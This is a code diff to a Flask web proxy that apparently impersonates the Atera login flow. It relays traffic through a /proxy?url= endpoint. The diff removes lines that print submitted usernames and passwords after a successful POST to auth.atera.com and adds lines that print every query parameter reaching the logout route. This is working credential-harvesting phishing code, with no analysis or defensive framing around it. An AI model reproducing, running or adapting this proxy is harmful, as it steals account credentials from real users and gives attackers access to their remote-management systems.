@@ -3,7 +3,7 @@ import os
 import re
 import requests
 from flask import Flask, request, Response, send_from_directory, make_response
-from urllib.parse import unquote
+from urllib.parse import unquote, urlparse, parse_qs
 
 app = Flask(__name__)
 
@@ -46,10 +46,6 @@ def proxy():
     url = ''.join(request.url.split("/proxy?url=")[1:])
     resp, headers = get_response(request, unquote(url))
 
-    if url.startswith("https://auth.atera.com/u/login/password") and request.method == "POST" and resp.status_code == 302:
-        [print(name + ":", value) for name, value in [name_value.split("=") for name_value in unquote(request.data).split("&")] if name in ["username", "password"]]
-        print()
-
     return Response(resp.content, resp.status_code, headers)
 
 
@@ -59,6 +55,11 @@ def logout():
 
     for cookie in request.cookies:
         response.delete_cookie(cookie)
+
+    parsed_url = parse_qs(urlparse(request.url).query)
+
+    if len([print(name + ":", value[0]) for (name, value) in parsed_url.items()]):
+        print()
 
     return response
 
